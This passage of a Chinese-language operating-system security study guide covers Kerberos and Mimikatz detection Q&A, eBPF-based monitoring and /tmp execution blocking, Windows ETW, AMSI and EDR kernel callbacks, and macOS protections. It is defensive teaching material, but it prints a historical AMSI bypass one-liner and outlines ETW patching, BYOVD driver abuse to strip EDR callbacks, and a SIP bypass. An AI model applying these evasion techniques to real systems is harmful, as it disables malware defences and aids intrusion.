- 由 krbtgt 哈希加密的 TGT 能伪造任意 RID 的用户 + 任意组 SID，且 KDC 验 PAC 时用 krbtgt 自身，攻击者等同于 KDC。

**Q8**：如何检测 Mimikatz 在主机上的执行？
- ETW + Sysmon Event 10 对 lsass.exe 的高权限 handle；Credential Guard / PPL（Protected Process Light）阻断；AMSI/AV 签名；ELAM 早期启动驱动扫描内存模式。

**Q9**：UAC 的完整性级别与 Integrity Check 如何阻止标准用户修改 System32？
- 系统目录对象的 Integrity 标记为 System/High，标准用户令牌 Medium，写入被 Mandatory Integrity Control 拒绝。

**Q10**：SELinux "enforcing"、"permissive"、"disabled" 三者区别？
- enforcing：强制 + 记录 denial；permissive：仅记录不阻止；disabled：完全关闭，连标签也不再维护（切回 enforcing 需 relabel）。

---

## 3.12 补充专题：eBPF 在安全中的应用

### 3.12.1 eBPF Hook 点总览

| Hook | 适用 | 示例 |
|------|------|------|
| kprobe / kretprobe | 内核函数任意点 | 监控 `vfs_write` |
| uprobe / uretprobe | 用户态库函数 | 监控 `SSL_read` 明文 |
| tracepoint | 稳定内核 tracepoint | `sched:sched_process_exec` |
| XDP | 网卡驱动前 | DDoS drop |
| TC | 流量控制层 | 协议级过滤 |
| LSM | Linux Security Module | 最新 Hook，替代 AppArmor 未来 |
| cgroup/skb | 容器网络 | K8s NetworkPolicy 实现（Cilium） |

### 3.12.2 bpftrace 一行拦截恶意 execve

```bash
bpftrace -e '
tracepoint:syscalls:sys_enter_execve {
    @cmd[pid] = str(args->filename);
}
tracepoint:syscalls:sys_exit_execve {
    if (strcontains(@cmd[pid], "/tmp/")) {
        printf("SUSPICIOUS EXEC from /tmp: pid=%d cmd=%s\n", pid, @cmd[pid]);
    }
    delete(@cmd[pid]);
}'
```

### 3.12.3 eBPF LSM 实战（Linux ≥ 5.7）

```c
// file.c  用 clang 编译为 BPF 字节码
SEC("lsm/bprm_check_security")
int BPF_PROG(block_tmp_exec, struct linux_binprm *bprm, int ret) {
    char comm[16];
    bpf_current_comm(comm, sizeof(comm));
    if (bpf_strncmp(bprm->filename, 5, "/tmp/") == 0) {
        bpf_printk("[LSM] deny exec from /tmp: %s", comm);
        return -EPERM;
    }
    return ret;
}
char _license[] SEC("license") = "GPL";
```

加载：`bpftool prog load file.o /sys/fs/bpf/block_tmp_exec` → `bpftool cgroup attach`。

### 3.12.4 可观测性工具链

- **Falco**：规则驱动（YAML），对系统调用做合规检查
- **Tetragon**（Isovalent）：eBPF + 策略，支持阻断
- **Tracee**（Aqua）：主打恶意软件行为识别
- **Cilium**：主要用于 K8s 网络，但其安全子集可做 L7 策略
- **Parca / Pyroscope**：持续性能分析，辅助排查疑似资源耗尽攻击

---

## 3.13 补充专题：Windows Defender / EDR 底层

### 3.13.1 ETW (Event Tracing for Windows)

- 内核级日志框架，子系统：Security-Auditing、Microsoft-Windows-Kernel-Process 等
- 攻击者："ETW Patching"——在 ntdll 中 `EtwEventWrite` 首字节 patch 为 `ret`

### 3.13.2 AMSI (Antimalware Scan Interface)

PowerShell / VBScript / .NET / Office Macro 在执行前把脚本交给 AMSI 提供方（Defender）扫描：

```
PS script → amsi.dll!AmsiScanBuffer → 加载的 Provider (MpOav.dll)
```

**绕过**（历史上）：

```powershell
# 修改 AmsiUtils 类字段
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'). `
  GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 或 Patch 内存中 AmsiScanBuffer 的第一个字节
```

Defender 现已把这些特征全部加入签名；现代技巧走 **直接 syscall** 或 unhook 绕过 user-mode 拦截。

### 3.13.3 Kernel Callbacks（EDR 核心）

Windows 提供以下 kernel callback 让 AV/EDR 驱动注册：

- `PsSetCreateProcessNotifyRoutine` - 进程创建
- `PsSetCreateThreadNotifyRoutine` - 线程创建
- `PsSetLoadImageNotifyRoutine` - 模块加载
- `CmRegisterCallback` - 注册表
- `ObRegisterCallbacks` - 句柄复制/打开
- `FltRegisterFilter` - MiniFilter 文件系统

EDR 在这些点实现进程树追踪、命令行捕获、LSASS 访问告警等。

**BYOVD 攻击**：加载一个带漏洞的签名驱动（`RTCore64.sys`、`procexp.sys`）→ 任意内核读写 → 撤销 EDR 的 kernel callback。

---

## 3.14 补充：macOS 安全简述

- **SIP (System Integrity Protection)**：限制即便 root 也不能修改 `/System`、`/usr`、`/bin`
- **TCC (Transparency, Consent and Control)**：对相机、麦克风、磁盘访问弹窗
- **Gatekeeper + Notarization**：禁止未签名、未公证的应用执行
- **XProtect**：内置反恶意软件签名
- **Endpoint Security Framework**：替代已弃用的 KAuth，ES Client 可监听 exec、fork、open 等事件
- 常见绕过：CVE-2023-32369（Migraine） 利用 `migrateLocalKDC` 关闭 SIP

---

## 3.15 延伸阅读

### 教材

- Mark Russinovich, David Solomon，《Windows Internals (7th Ed.)》
- Michael Kerrisk，《The Linux Programming Interface》
- Sean Metcalf，《Active Directory Security》系列博客 <https://adsecurity.org>
- Daniel Bovet, Marco Cesati，《Understanding the Linux Kernel》

### 标准 / 基准

- CIS Benchmarks：<https://www.cisecurity.org/cis-benchmarks/>
- NIST SP 800-53 / SP 800-123
- Microsoft Security Baselines

### 论文 / 博客 / 资源

- Kemerlis et al., *ret2dir: Rethinking Kernel Isolation*, USENIX Security 2014
- Google Project Zero：Dirty Pipe / PrintNightmare 技术博客
- HackTricks：<https://book.hacktricks.xyz/>
- ired.team（Windows 红队）
- GTFOBins / LOLBAS：<https://gtfobins.github.io/> / <https://lolbas-project.github.io/>
- Falco / Tetragon / Tracee 项目文档（eBPF 运行时安全）
- MITRE ATT&CK：<https://attack.mitre.org>
